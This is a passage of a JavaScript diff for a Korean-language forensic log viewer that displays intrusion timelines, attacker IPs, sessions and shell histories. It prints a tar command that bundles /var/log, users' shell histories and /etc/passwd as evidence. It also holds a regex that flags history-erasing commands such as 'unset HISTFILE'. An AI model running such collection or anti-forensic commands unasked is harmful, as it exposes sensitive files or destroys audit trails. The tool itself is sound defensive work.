+const up = { server:null, busy:false, items:[], msg:'', err:'', job:null, append:true };
+const hv = { file:0, q:'', risky:false };
+const st = { view:'overview', cats:new Set(), minSev:0, q:'', ip:null, user:null, sid:null, limit:300, open:new Set(), hideNoise:true, explain:true };
+try{ st.explain = localStorage.getItem('secview-explain')!=='0'; }catch(_){}
+function load(data){
+  D = data; E = D.events; CATS = D.cats; M = D.meta; OFF = M.tz_offset_min;
+  E.forEach((e,i)=>{ e._i=i; });
+  bySid = {}; E.forEach(e=>{ if(e.sid) (bySid[e.sid] ||= []).push(e); });
+  SESS = {}; D.sessions.forEach(s=>SESS[s.id]=s);
+  HIST = D.histories || [];
+  bySrcLine = {}; E.forEach(e=>{ if(e.src && e.line) bySrcLine[e.src+':'+e.line] = e; });
+  if(M.job) up.job = M.job;
+  hv.q = ''; hv.risky = false;
+  const risk = HIST.map(h=>h.entries.filter(([ln])=>{ const e=bySrcLine[h.path+':'+ln]; return e && sr(e.sev)>=3; }).length);
+  hv.file = risk.length ? risk.indexOf(Math.max(...risk)) : 0;
+  Object.assign(st, { view: E.length ? 'overview' : 'upload', cats:new Set(Object.keys(CATS)), minSev:0, q:'', ip:null, user:null, sid:null, limit:300, open:new Set() });
+}
+load(JSON.parse(document.getElementById('secview-data').textContent));
+try{ const t=localStorage.getItem('secview-theme'); if(t) document.documentElement.dataset.theme=t; }catch(_){}
+
+const $ = s=>document.querySelector(s);
+const esc = s => String(s==null?'':s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+function iso(ts){ return new Date((ts+OFF*60)*1000).toISOString(); }
+function fmt(ts){ if(ts==null) return '시각 미상'; const s=iso(ts); return s.slice(0,10)+' '+s.slice(11,19); }
+function hms(ts){ return ts==null?'—':iso(ts).slice(11,19); }
+function day(ts){ return ts==null?'':iso(ts).slice(0,10); }
+function dur(a,b){ if(a==null||b==null) return ''; let s=Math.max(0,Math.round(b-a)); const h=Math.floor(s/3600), m=Math.floor(s%3600/60); s%=60; return h?`${h}시간 ${m}분`:m?`${m}분 ${s}초`:`${s}초`; }
+const catB = c => `<span class="cat" style="--c:var(--c-${c})">${esc(CATS[c]||c)}</span>`;
+const sevB = s => `<span class="sev ${s}">${SEV_L[s]}</span>`;
+const HOT = /유출|백도어|무차별|덤프|흔적|변조|UID 0/;
+const tagsH = e => (e.tags||[]).map(t=>`<span class="tag${HOT.test(t)?' hot':''}">${esc(t)}</span>`).join('');
+const ipH = e => e.ip ? `<a data-act="ip" data-v="${esc(e.ip)}" class="${e.ip_inferred?'inferred':''}" title="${e.ip_inferred?'세션 시간대로 추정한 IP':''}">${esc(e.ip)}</a>` : '';
+const isNoise = e => e.sev==='info' && (e.cat==='session' || e.cat==='auth');
+/* 해설: full=true 면 옵션 설명·확인할 것까지, false 면 요약 문장만 */
+function explH(e, full){
+  if(!st.explain) return '';
+  const x = e.explain, sum = x ? x.summary.join(' ') : '';
+  if(!sum && !e.note && !(full && x && x.details.length)) return '';
+  let h = '<div class="expl">';
+  if(sum || e.note) h += `<div class="ex-sum"><span class="ex-ic" aria-hidden="true">💬</span><span>${esc(sum || e.note)}</span></div>`;
+  if(full && x){
+    if(x.details.length) h += `<ul class="ex-det">${x.details.map(([t,d])=>`<li><code>${esc(t)}</code><span>${esc(d)}</span></li>`).join('')}</ul>`;
+    if(sum && e.note) h += `<div class="ex-note">${esc(e.note)}</div>`;
+    if(x.check.length) h += `<div class="ex-chk"><b>확인할 것</b> ${x.check.map(esc).join(' ')}</div>`;
+  }
+  return h + '</div>';
+}
+const explText = e => [e.explain ? e.explain.summary.join(' ') : '', e.note||''].filter(Boolean).join(' / ');
+
+/* ── 헤더 ── */
+function renderMeta(){
+  const r = M.range;
+  $('#meta').innerHTML = M.empty ? '<span>로그를 불러오면 분석 결과가 여기에 표시됩니다</span>' : [
+    M.hosts.length?`호스트 <b>${esc(M.hosts.join(', '))}</b>`:'',
+    r?`기간 <b>${fmt(r[0])}</b> ~ <b>${fmt(r[1])}</b> <span>(${esc(M.tz_label)})</span>`:'',
+    `이벤트 <b>${E.length.toLocaleString()}</b>`,
+    `생성 ${esc(M.generated)}`
+  ].filter(Boolean).map(x=>`<span>${x}</span>`).join('');
+}
+$('#theme').onclick = ()=>{
+  const cur = document.documentElement.dataset.theme || (matchMedia('(prefers-color-scheme: light)').matches?'light':'dark');
+  const nt = cur==='dark'?'light':'dark'; document.documentElement.dataset.theme=nt;
+  try{ localStorage.setItem('secview-theme', nt); }catch(_){}
+};
+if(!document.documentElement.dataset.theme && matchMedia('(prefers-color-scheme: light)').matches) document.documentElement.dataset.theme='light';
+
+function renderNav(){
+  const VIEWS = [['overview','개요'],['timeline','타임라인',E.length],['ips','공격자 IP',D.ips.length],['sessions','세션',D.sessions.length],
+    ['history','히스토리',HIST.length],['sources','로그 소스',M.sources.length],['guide','로그 가이드'],['upload','⤒ 로그 불러오기']];
+  $('#nav').innerHTML = VIEWS.map(([k,l,n])=>`<button data-act="view" data-v="${k}" class="${st.view===k?'on':''}">${l}${n!=null?`<span class="n">${n.toLocaleString()}</span>`:''}</button>`).join('');
+}
+
+/* ── 업로드 ── */
+const TZS = (()=>{ const o=-new Date().getTimezoneOffset(); const f=m=>(m<0?'-':'+')+String(Math.floor(Math.abs(m)/60)).padStart(2,'0')+':'+String(Math.abs(m)%60).padStart(2,'0');
+  const l=[[f(o),`이 PC 시간대 (UTC${f(o)})`]]; [['+09:00','한국/일본 (UTC+09:00)'],['+00:00','UTC'],['+08:00','UTC+08:00'],['-05:00','UTC-05:00'],['-08:00','UTC-08:00']].forEach(x=>{ if(x[0]!==f(o)) l.push(x); }); return l; })();
+up.tz = TZS[0][0];
+async function checkServer(){
+  if(!/^https?:$/.test(location.protocol)){ up.server=false; return; }
+  try{ const r = await fetch('/api/ping',{cache:'no-store'}); const j = await r.json(); up.server = r.ok && j.upload===true; if(j.job) up.job = j.job; }catch(_){ up.server=false; }
+  if(st.view==='upload') render();
+}
+const SUPPORTED = [
+  ['auth.log*, secure*', '/var/log', 'SSH 로그인 성공·실패, sudo, 계정 생성, SFTP 전송'],
+  ['audit.log*', '/var/log/audit', '실행된 모든 명령(EXECVE), scp 유출, 로그인 세션'],
+  ['.bash_history, .zsh_history', '/root, /home/계정', '공격자가 입력한 명령어 (폴더째 올리면 계정 구분)'],
+  ['wtmp, btmp', '/var/log', '로그인/로그아웃 기록, 로그인 실패 기록 (바이너리)'],
+  ['MySQL general log', '/var/log/mysql', 'mysqldump 덤프, INTO OUTFILE'],
+  ['PostgreSQL 로그', '/var/log/postgresql', 'pg_dump 접속, COPY TO 추출'],
+  ['xferlog, vsftpd.log', '/var/log', 'FTP 업로드·다운로드'],
+  ['passwd', '/etc', 'UID 0 백도어 계정 확인, uid→계정명'],
+  ['messages, syslog 등', '/var/log', '이름이 달라도 내용을 보고 SSH/audit/DB 로그를 자동 인식'],
+];
+function uploadView(){
+  const off = up.server===false;
+  const status = up.items.length ? `<div class="panel" style="margin-top:16px"><h2>${up.busy?'처리 중…':'결과'} <small>${esc(up.msg)}</small></h2>
+    <div class="tablewrap" style="border:0"><table style="min-width:520px"><thead><tr><th>올린 파일</th><th>상태</th><th>인식 결과</th></tr></thead><tbody>
+    ${up.items.map(it=>`<tr><td class="mono" style="word-break:break-all">${esc(it.path)} <span style="color:var(--faint)">${fsize(it.size)}</span></td><td style="white-space:nowrap">${esc(it.status)}</td>
+      <td style="font-size:12.5px">${it.placed?it.placed.slice(0,6).map(p=>`<div><span class="mono">${esc(p[1])}</span>${p[0]!==it.path?` <span style="color:var(--faint)">← ${esc(p[0])}</span>`:''}</div>`).join('')+(it.placed.length>6?`<div style="color:var(--muted)">외 ${it.placed.length-6}개</div>`:''):''}
+      ${it.skipped_count?`<div style="color:var(--muted)">인식 못한 파일 ${it.skipped_count}개 (분석 대상 아님)</div>`:''}${(it.dups||[]).length?`<div style="color:var(--muted)">이미 올린 파일과 내용이 같아 건너뜀 ${it.dups.length}개</div>`:''}${it.error?`<div style="color:var(--crit)">${esc(it.error)}</div>`:''}</td></tr>`).join('')}
+    </tbody></table></div></div>` : '';
+  return `<div class="panel">
+    <h2>로그 불러오기 <small>파일 · 폴더 · 압축파일(zip, tar.gz) 모두 가능</small></h2>
+    ${off?`<div class="notes" style="margin:10px 0 14px"><div>지금 화면은 저장된 HTML 파일이라 업로드를 처리할 수 없습니다. 업로드는 분석 서버를 띄워야 동작합니다.</div>
+      <pre class="raw" style="margin-top:8px">python secviewer.py --web</pre><div style="margin-top:6px">실행하면 브라우저가 자동으로 열립니다 (직접 열 때는 http://127.0.0.1:8080). 그 화면에 파일을 끌어다 놓으세요.</div></div>`:''}
+    <div id="drop" class="dropzone${off?' disabled':''}">
+      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 16V4"/><path d="M7 9l5-5 5 5"/><path d="M4 16v3a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-3"/></svg>
+      <div class="dz-t">${up.busy?esc(up.msg||'처리 중…'):'로그 파일이나 폴더, 압축파일을 여기에 끌어다 놓으세요'}</div>
+      <div class="dz-s">수집한 <span class="mono">/var/log</span> 폴더째, 또는 <span class="mono">evidence.tgz</span> 를 그대로 올려도 됩니다 · 다른 탭을 보는 중에도 화면 어디에 놓아도 됩니다</div>
+      ${up.job && !off ? `<div class="dz-s" style="margin-top:6px">${up.append?'새로 올린 로그는 <b>지금 결과에 합쳐서</b> 다시 분석합니다. 같은 파일을 두 번 올리면 자동으로 건너뜁니다.':'새로 올리면 <b>지금 결과를 버리고</b> 새로 분석합니다.'}</div>` : ''}
+      <div class="acts" style="justify-content:center">
+        <button class="iconbtn primary" data-act="pick" ${off||up.busy?'disabled':''}>파일 선택</button>
+        <button class="iconbtn" data-act="pickdir" ${off||up.busy?'disabled':''}>폴더 선택</button>
+        ${up.job && !off ? `<label class="appendchk"><input type="checkbox" id="append" ${up.append?'checked':''} ${up.busy?'disabled':''}>지금 결과에 추가로 합치기</label>` : ''}
+        <select id="tz" ${up.busy?'disabled':''} title="syslog 처럼 시간대가 없는 로그를 어떤 시간대로 해석할지">${TZS.map(([v,l])=>`<option value="${v}" ${up.tz===v?'selected':''}>로그 시간대: ${esc(l)}</option>`).join('')}</select>
+      </div>
+      <input type="file" id="fin" multiple hidden><input type="file" id="din" webkitdirectory multiple hidden>
+    </div>
+    ${up.err?`<div class="notes" style="margin-top:12px"><div>${esc(up.err)}</div></div>`:''}
+  </div>${status}
+  <div class="panel" style="margin-top:16px"><h2>어떤 파일을 올리면 되나요?</h2>
+    <div class="tablewrap" style="border:0"><table style="min-width:560px"><thead><tr><th>파일</th><th>서버 위치</th><th>보이는 것</th></tr></thead><tbody>
+    ${SUPPORTED.map(r=>`<tr><td class="mono">${esc(r[0])}</td><td class="mono" style="color:var(--muted)">${esc(r[1])}</td><td>${esc(r[2])}</td></tr>`).join('')}</tbody></table></div>
+    <p style="font-size:13px;color:var(--muted);margin:12px 0 4px">서버에서 한 번에 모으기 (압축 후 이 화면에 그대로 올리세요):</p>
+    <pre class="raw">sudo tar czf evidence.tgz /var/log /root/.*_history /home/*/.*_history /etc/passwd</pre></div>`;
+}
+const fsize = n => n==null?'':n<1024?n+' B':n<1048576?(n/1024).toFixed(1)+' KB':n<1073741824?(n/1048576).toFixed(1)+' MB':(n/1073741824).toFixed(2)+' GB';
+async function collect(dt){
+  const entries = [...(dt.items||[])].map(i=>i.webkitGetAsEntry && i.webkitGetAsEntry()).filter(Boolean);
+  if(!entries.length) return [...dt.files].map(f=>({f, path:f.name}));
+  const out = [];
+  async function walk(en, prefix){
+    if(en.isFile){ const f = await new Promise((res,rej)=>en.file(res,rej)); out.push({f, path:prefix+en.name}); }
+    else if(en.isDirectory){ const rd = en.createReader(); let batch;
+      do { batch = await new Promise((res,rej)=>rd.readEntries(res,rej)); for(const c of batch) await walk(c, prefix+en.name+'/'); } while(batch.length); }
+  }
+  for(const en of entries) await walk(en, '');
+  return out;
+}
+async function uploadAll(list){
+  if(up.server===false){ st.view='upload'; render(); return; }
+  if(up.busy || !list.length) return;
+  const job = (up.append && up.job) ? up.job : [...crypto.getRandomValues(new Uint8Array(12))].map(b=>b.toString(16).padStart(2,'0')).join('');
+  const appending = job === up.job;
+  Object.assign(up, {busy:true, err:'', items:list.map(x=>({path:x.path, size:x.f.size, status:'대기'}))});
+  st.view='upload';
+  try{
+    for(let i=0;i<list.length;i++){
+      const it = up.items[i], x = list[i];
+      it.status='업로드 중'; up.msg=`업로드 ${i+1}/${list.length}`; render();
+      const r = await fetch(`/api/upload?job=${job}&name=${encodeURIComponent(x.path)}&mtime=${x.f.lastModified||0}`, {method:'POST', body:x.f});
+      const j = await r.json();
+      if(!r.ok) throw new Error(j.error||('HTTP '+r.status));
+      Object.assign(it, j); it.status = j.error?'오류':j.placed.length?'인식됨':(j.dups&&j.dups.length)?'이미 올린 파일':'인식 못함';
+    }
+    if(!appending && !up.items.some(it=>it.placed && it.placed.length)) throw new Error('분석할 수 있는 로그가 없습니다. 아래 표의 파일을 올려주세요.');
+    if(appending && !up.items.some(it=>it.placed && it.placed.length)) throw new Error('새로 추가된 로그가 없습니다. (이미 올린 파일이거나 분석 대상이 아닌 파일)');
+    up.msg='분석 중…'; render();
+    const r = await fetch(`/api/analyze?job=${job}&tz=${encodeURIComponent(up.tz)}`, {method:'POST'});
+    if(!r.ok) throw new Error('분석 실패 (HTTP '+r.status+')');
+    const data = await r.json();
+    up.busy=false; up.msg=`${appending?'기존 결과에 추가 · ':''}올린 파일 ${up.items.length}개 → 전체 이벤트 ${data.events.length.toLocaleString()}건`;
+    load(data); renderMeta(); if(!E.length) st.view='upload'; render(); window.scrollTo(0,0);
+  }catch(ex){ up.busy=false; up.err = String(ex.message||ex); up.msg=''; render(); }
+}
+let dragDepth = 0;
+document.addEventListener('dragenter', ev=>{ if(![...(ev.dataTransfer?.types||[])].includes('Files')) return; ev.preventDefault(); dragDepth++; document.body.classList.add('dragging'); });
+document.addEventListener('dragleave', ()=>{ if(--dragDepth<=0){ dragDepth=0; document.body.classList.remove('dragging'); } });
+document.addEventListener('dragover', ev=>{ if([...(ev.dataTransfer?.types||[])].includes('Files')) ev.preventDefault(); });
+document.addEventListener('drop', async ev=>{
+  if(![...(ev.dataTransfer?.types||[])].includes('Files')) return;
+  ev.preventDefault(); dragDepth=0; document.body.classList.remove('dragging');
+  const p = collect(ev.dataTransfer);   // webkitGetAsEntry 는 drop 이벤트 안에서 바로 호출해야 함
+  uploadAll(await p);
+});
+document.addEventListener('change', ev=>{
+  if(ev.target.id==='fin' || ev.target.id==='din') uploadAll([...ev.target.files].map(f=>({f, path:f.webkitRelativePath||f.name})));
+  if(ev.target.id==='tz') up.tz = ev.target.value;
+  if(ev.target.id==='append') up.append = ev.target.checked;
+});
+
+/* ── 필터 ── */
+function searchText(e){ return e._s || (e._s = [e.msg,e.cmd,e.user,e.ip,e.raw,e.src,e.cwd,(e.tags||[]).join(' '),explText(e)].join(' ').toLowerCase()); }
+function filtered(){
+  const q = st.q.trim().toLowerCase();
+  return E.filter(e => st.cats.has(e.cat) && sr(e.sev)>=st.minSev && (!st.ip||e.ip===st.ip) && (!st.user||e.user===st.user)
+    && (!st.sid||e.sid===st.sid) && (!st.hideNoise || st.ip || st.sid || !isNoise(e)) && (!q || searchText(e).includes(q)));
+}
+function go(view, f){
+  Object.assign(st, {view, limit:300}, f||{}); render(); window.scrollTo(0,0);
+}
+
+/* ── 개요 ── */
+function overview(){
+  const ext = D.ips.filter(p=>p.ok>0 && !p.private);
+  const fails = D.ips.reduce((a,p)=>a+p.fails,0);
+  const cmds = E.filter(e=>e.via && e.cat!=='db' || e.via==='audit' || (e.via && e.cmd && e.cat==='db' && !(e.tags||[]).includes('DB 히스토리'))).length;
+  const dbd = E.filter(e=>e.cat==='db' && e.sev==='crit').length;
+  const xfer = E.filter(e=>e.cat==='transfer').length;
+  const xferOut = E.filter(e=>e.cat==='transfer' && /유출/.test(e.msg+(e.tags||[]).join())).length;
+  const pa = E.filter(e=>e.cat==='persist'||e.cat==='antiforensic').length;
+  const K = [
+    ['침입 성공 외부 IP', ext.length, ext.slice(0,3).map(p=>p.ip).join(', ')||'없음', '--crit', ()=>go('ips')],
+    ['SSH 로그인 실패', fails, `${D.ips.filter(p=>p.fails>=5).length}개 IP 무차별 대입`, '--c-auth', ()=>go('timeline',{cats:new Set(['auth']),minSev:0})],
+    ['실행 명령', cmds, '히스토리 · auditd · sudo', '--c-cmd', ()=>go('timeline',{cats:new Set(['cmd','recon','exec','privesc','persist','antiforensic','db','transfer']),q:'',minSev:0})],
+    ['DB 덤프', dbd, 'mysqldump · pg_dump · OUTFILE', '--c-db', ()=>go('timeline',{cats:new Set(['db']),minSev:0})],
+    ['파일 전송', xfer, `유출 의심 ${xferOut}건`, '--c-transfer', ()=>go('timeline',{cats:new Set(['transfer']),minSev:0})],
+    ['지속성 · 흔적삭제', pa, '계정 · 키 · cron · history', '--c-persist', ()=>go('timeline',{cats:new Set(['persist','antiforensic']),minSev:0})],
+  ];
+  window._kpi = K.map(k=>k[4]);
+  let h = `<div class="kpis">${K.map((k,i)=>`<button class="kpi${k[1]?'':' zero'}" style="--k:var(${k[3]})" data-act="kpi" data-v="${i}"><div class="l">${k[0]}</div><div class="v">${k[1].toLocaleString()}</div><div class="s">${esc(k[2])}</div></button>`).join('')}</div>`;
+  if(M.notes.length) h += `<div class="notes">${M.notes.map(n=>`<div>${esc(n)}</div>`).join('')}</div>`;
+
+  const key = E.filter(e=>sr(e.sev)>=3 && e.ts!=null);
+  let lastDay='';
+  const flow = key.slice(0,80).map(e=>{
+    const d = day(e.ts); const sep = d!==lastDay ? `<div class="daysep">${d}</div>` : ''; lastDay=d;
+    return sep+`<li data-act="ev" data-v="${e._i}" style="--c:var(--c-${e.cat})"><div class="t">${hms(e.ts)}</div><div class="dot"></div><div class="b">
+      <div>${catB(e.cat)} <span class="m">${esc(e.msg)}</span></div>
+      ${e.cmd?`<code>${esc(e.cmd)}</code>`:''}${explH(e,false)}
+      <div class="who">${[e.user, e.ip].filter(Boolean).map(esc).join(' · ')}${e.sid?` · 세션 ${esc(e.sid)}`:''} · ${esc(e.src||'')}</div></div></li>`;
+  }).join('');
+  h += `<div class="grid2"><section class="panel"><h2>공격 흐름 <small>위험도 높음 이상 ${key.length}건, 시간순</small></h2>
+    ${key.length?`<ul class="flow">${flow}</ul>${key.length>80?`<a data-act="kpi-high" class="more iconbtn" style="text-align:center">전체 ${key.length}건 타임라인에서 보기</a>`:''}`:'<div class="empty">높은 위험도 이벤트가 없습니다.</div>'}</section>
+    <section><div class="panel" style="margin-bottom:16px"><h2>위험 IP <small>상위 ${Math.min(6,D.ips.length)}</small></h2>${D.ips.slice(0,6).map(ipMini).join('')||'<div class="empty">IP 정보 없음</div>'}</div>
+    <div class="panel"><h2>위험 세션</h2>${D.sessions.filter(s=>sr(s.max_sev)>=3).slice(0,8).map(sessMini).join('')||'<div class="empty">없음</div>'}</div></section></div>`;
+  return h;
+}
+function ipMini(p){
+  const max = D.ips[0].score||1;
+  return `<div style="padding:8px 0;border-bottom:1px solid var(--line2)">
+    <div style="display:flex;align-items:center;gap:8px"><a class="mono" data-act="ipcard" data-v="${esc(p.ip)}" style="font-weight:600">${esc(p.ip)}</a>
+    ${p.private?'<span class="badge">내부</span>':''}${p.ok&&p.fails>=3?'<span class="badge red">무차별 대입 성공</span>':p.ok?'<span class="badge red">로그인 성공</span>':''}
+    <span style="margin-left:auto;font-size:12px;color:var(--muted)">실패 ${p.fails} · 성공 ${p.ok}</span></div>
+    <div class="score" style="margin:6px 0 0"><i style="width:${Math.max(3,p.score/max*100)}%"></i></div></div>`;
+}
+function sessMini(s){
+  return `<div style="padding:7px 0;border-bottom:1px solid var(--line2);cursor:pointer" data-act="sess" data-v="${s.id}">
+    <div><b class="mono">${esc(s.user||'?')}@${esc(s.ip||'local')}</b> ${sevB(s.max_sev)}</div>
+    <div style="font-size:12px;color:var(--muted)">${fmt(s.start)} · ${dur(s.start, s.end ?? s.last)} · 이벤트 ${s.n}</div></div>`;
+}
+
+/* ── 타임라인 ── */
+function timeline(){
+  const cnt = {}; E.forEach(e=>cnt[e.cat]=(cnt[e.cat]||0)+1);
+  const rows = filtered();
+  const pills = [['ip','IP'],['user','사용자'],['sid','세션']].filter(([k])=>st[k]).map(([k,l])=>`<span class="pill">${l}: <b class="mono">${esc(st[k])}</b><button data-act="clr" data-v="${k}" aria-label="필터 해제">×</button></span>`).join('');
+  let h = `<div class="toolbar">
+    <input class="search" id="q" placeholder="검색: 명령어, IP, 계정, 파일 경로, 원본 로그…" value="${esc(st.q)}">
+    <select id="sev">${SEVS.map((s,i)=>`<option value="${i}" ${st.minSev===i?'selected':''}>${i?SEV_L[s]+' 이상':'모든 위험도'}</option>`).join('')}</select>
+    <label style="font-size:12.5px;color:var(--muted);display:flex;gap:5px;align-items:center"><input type="checkbox" id="noise" ${st.hideNoise?'checked':''}>접속 잡음 숨김</label>
+    <label style="font-size:12.5px;color:var(--muted);display:flex;gap:5px;align-items:center"><input type="checkbox" id="explain" ${st.explain?'checked':''}>명령어 해설 보기</label>
+    <button class="iconbtn" data-act="csv">CSV 내보내기</button></div>
+  <div class="chips"><button class="chip" data-act="allcats" style="--c:var(--muted)">${st.cats.size===Object.keys(CATS).length?'모두 해제':'모두 선택'}</button>
+    ${Object.keys(CATS).map(c=>`<button class="chip ${st.cats.has(c)?'on':''}" data-act="cat" data-v="${c}" style="--c:var(--c-${c})"><i></i>${esc(CATS[c])}<span class="n">${cnt[c]||0}</span></button>`).join('')}</div>
+  <div class="toolbar">${pills}<span class="count">${rows.length.toLocaleString()}건${rows.length>st.limit?` 중 ${st.limit.toLocaleString()}건 표시`:''}</span></div>`;
+  if(!rows.length) return h+`<div class="tablewrap"><div class="empty">조건에 맞는 이벤트가 없습니다.</div></div>`;
+  h += `<div class="tablewrap"><table><thead><tr><th>시각 (${esc(M.tz_label)})</th><th>위험</th><th>분류</th><th>사용자</th><th>출발지 IP</th><th>내용</th><th>출처</th></tr></thead><tbody>`;
+  h += rows.slice(0,st.limit).map(rowH).join('');
+  h += `</tbody></table></div>`;
+  if(rows.length>st.limit) h += `<button class="iconbtn more" data-act="more">더 보기 (+500)</button>`;
+  return h;
+}
+function rowH(e){
+  const open = st.open.has(e._i);
+  return `<tr class="ev ${e.sev}${open?' open':''}" data-act="row" data-v="${e._i}">
+    <td class="t">${fmt(e.ts)}</td><td>${sevB(e.sev)}</td><td>${catB(e.cat)}</td>
+    <td>${e.user?`<a data-act="user" data-v="${esc(e.user)}">${esc(e.user)}</a>`:''}</td>
+    <td class="ipc">${ipH(e)}</td>
+    <td class="m"><div class="msg">${esc(e.msg)}</div>${e.cmd?`<code>${esc(e.cmd)}</code>`:''}${explH(e,true)}<div>${tagsH(e)}</div></td>
+    <td class="src">${esc(e.src||'')}${e.line?':'+e.line:''}</td></tr>`
+    + (open?`<tr class="detail"><td colspan="7">${detailH(e)}</td></tr>`:'');
+}
+function detailH(e){
+  const s = e.sid && SESS[e.sid];
+  const kv = [
+    ['출처', `<span class="mono">${esc(e.src||'')}${e.line?':'+e.line:''}</span>`],
+    s?['세션', `<a data-act="sess" data-v="${s.id}">${esc(s.id)} — ${esc(s.user||'?')}@${esc(s.ip||'local')} (${fmt(s.start)} 시작)</a>`]:null,
+    e.cwd?['작업 경로', `<span class="mono">${esc(e.cwd)}</span>`]:null,
+    e.pid?['PID', `<span class="mono">${esc(e.pid)}</span>`]:null,
+    e.exe?['실행 파일', `<span class="mono">${esc(e.exe)}</span>`]:null,
+    e.ses?['audit 세션', `<span class="mono">ses=${esc(e.ses)}</span>`]:null,
+    e.path?['파일', `<span class="mono">${esc(e.path)}</span>`]:null,
+    e.count?['횟수', `${e.count}회${e.until?` (마지막 ${fmt(e.until)})`:''}`]:null,
+    e.ip_inferred?['참고', '이 IP 는 로그에 직접 기록된 값이 아니라, 같은 시간대에 열려 있던 유일한 외부 SSH 세션으로 추정한 값입니다.']:null,
+  ].filter(Boolean);
+  return `<dl class="kv">${kv.map(([k,v])=>`<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl>${e.raw?`<div style="margin-top:10px"><pre class="raw">${esc(e.raw)}</pre></div>`:''}`;
+}
+function csv(){
+  const rows = filtered();
+  const q = v => '"' + String(v==null?'':v).replace(/"/g,'""') + '"';
+  const out = ['시각,위험,분류,사용자,IP,세션,내용,명령/대상,해설,태그,출처'].concat(rows.map(e=>[fmt(e.ts),SEV_L[e.sev],CATS[e.cat],e.user,e.ip,e.sid,e.msg,e.cmd,explText(e),(e.tags||[]).join(' | '),(e.src||'')+(e.line?':'+e.line:'')].map(q).join(',')));
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob(['\ufeff'+out.join('\r\n')],{type:'text/csv'}));
+  a.download = 'secview_events.csv'; a.click(); setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
+}
+
+/* ── 공격자 ── */
+function ips(){
+  if(!D.ips.length) return '<div class="panel empty">IP 가 기록된 이벤트가 없습니다.</div>';
+  const max = D.ips[0].score||1;
+  return `<div class="cards">${D.ips.map(p=>{
+    const hot = p.ok && !p.private;
+    const cats = Object.entries(p.cats).sort((a,b)=>b[1]-a[1]).map(([c,n])=>`${catB(c)} <span style="font-size:12px;color:var(--muted)">${n}</span>`).join(' ');
+    return `<div class="card${hot?' hot':''}" id="ip-${esc(p.ip)}">
+      <h3>${esc(p.ip)} ${p.private?'<span class="badge">내부망</span>':'<span class="badge">외부</span>'}${p.ok&&p.fails>=3?'<span class="badge red">무차별 대입 성공</span>':p.ok?'<span class="badge red">로그인 성공</span>':p.fails>=5?'<span class="badge">무차별 대입</span>':''}</h3>
+      <div class="score" title="위험 점수 ${p.score}"><i style="width:${Math.max(2,p.score/max*100)}%"></i></div>
+      <div class="stats"><div><b>${p.fails.toLocaleString()}</b><span>로그인 실패</span></div><div><b style="${p.ok?'color:var(--crit)':''}">${p.ok}</b><span>로그인 성공</span></div><div><b>${p.sessions.length}</b><span>세션</span></div></div>
+      ${p.ok_users.length?`<div class="row">성공 계정 <b class="mono" style="color:var(--crit)">${p.ok_users.map(esc).join(', ')}</b></div>`:''}
+      ${p.tried.length?`<div class="row">시도 계정 <b class="mono">${p.tried.slice(0,8).map(([u,n])=>esc(u)+(n?`(${n})`:'')).join(', ')}${p.tried.length>8?' …':''}</b></div>`:''}
+      <div class="row">최초 <b class="mono">${fmt(p.first)}</b></div><div class="row">최종 <b class="mono">${fmt(p.last)}</b></div>
+      ${cats?`<div class="row" style="margin-top:8px">${cats}</div>`:''}
+      <div class="acts"><button class="iconbtn" data-act="ip" data-v="${esc(p.ip)}">타임라인</button>${p.sessions.length?`<button class="iconbtn" data-act="ipsess" data-v="${esc(p.ip)}">세션 ${p.sessions.length}개</button>`:''}</div></div>`;
+  }).join('')}</div>`;
+}
+
+/* ── 세션 ── */
+function sessions(){
+  let list = D.sessions;
+  if(st.ip) list = list.filter(s=>s.ip===st.ip);
+  if(!list.length) return '<div class="panel empty">세션 정보가 없습니다. (auth.log / wtmp / audit 의 로그인 기록으로 만듭니다)</div>';
+  const head = st.ip?`<div class="toolbar"><span class="pill">IP: <b class="mono">${esc(st.ip)}</b><button data-act="clr" data-v="ip">×</button></span></div>`:'';
+  return head + list.map(s=>{
+    const es = (bySid[s.id]||[]).filter(e=>!isNoise(e) || e.kind==='login_ok');
+    const hot = sr(s.max_sev)>=4;
+    const cats = Object.entries(s.cats).filter(([c])=>c!=='auth').map(([c,n])=>`${catB(c)}<span style="font-size:12px;color:var(--muted);margin:0 6px 0 3px">${n}</span>`).join('');
+    return `<details class="sess${hot?' hot':''}" id="sess-${s.id}" ${hot||st.sid===s.id?'open':''}>
+      <summary><span class="mono" style="color:var(--faint)">${s.id}</span><span class="who">${esc(s.user||'?')}@${esc(s.ip||'local')}</span>${sevB(s.max_sev)}
+      <span class="when">${fmt(s.start)} → ${s.end!=null?hms(s.end):'종료 기록 없음'} · ${dur(s.start, s.end ?? s.last)}</span>
+      ${s.method?`<span class="badge">${esc(s.method)}</span>`:''}${s.fails_before>=3?`<span class="badge red">직전 실패 ${s.fails_before}회</span>`:''}
+      <span style="font-size:12px;color:var(--faint)">근거: ${esc(s.sources.join(', '))}</span><span>${cats}</span></summary>
+      <div class="body">${es.map(e=>`<div class="sline" data-act="ev" data-v="${e._i}"><span class="t">${hms(e.ts)}</span><span class="c">${catB(e.cat)}</span>
+        <span><span class="mm" style="color:var(--${e.sev==='info'?'muted':e.sev})">${esc(e.msg)}</span>${e.cmd?`<code>${esc(e.cmd)}</code>`:''}${explH(e,false)}</span></div>`).join('')||'<div class="empty">연결된 이벤트 없음</div>'}</div></details>`;
+  }).join('');
+}
+
+/* ── 히스토리 원문 ── */
+const HIST_TAMPER = /history\s+-[cw]|unset\s+HISTFILE|HISTFILE=\/dev\/null|HISTSIZE=0|set\s+\+o\s+history/;
+function historyView(){
+  if(!HIST.length) return `<div class="panel empty">셸 히스토리 파일이 없습니다.<br><span style="font-size:13px">/root/.bash_history, /home/계정/.bash_history 를 올리면 여기서 원문을 줄 단위로 볼 수 있습니다.</span></div>`;
+  const h = HIST[Math.min(hv.file, HIST.length-1)];
+  const q = hv.q.trim().toLowerCase();
+  const list = HIST.map((x,i)=>{
+    const risky = x.entries.filter(([ln])=>{ const e=bySrcLine[x.path+':'+ln]; return e && sr(e.sev)>=3; }).length;
+    return `<button class="hfile${i===hv.file?' on':''}" data-act="hfile" data-v="${i}">
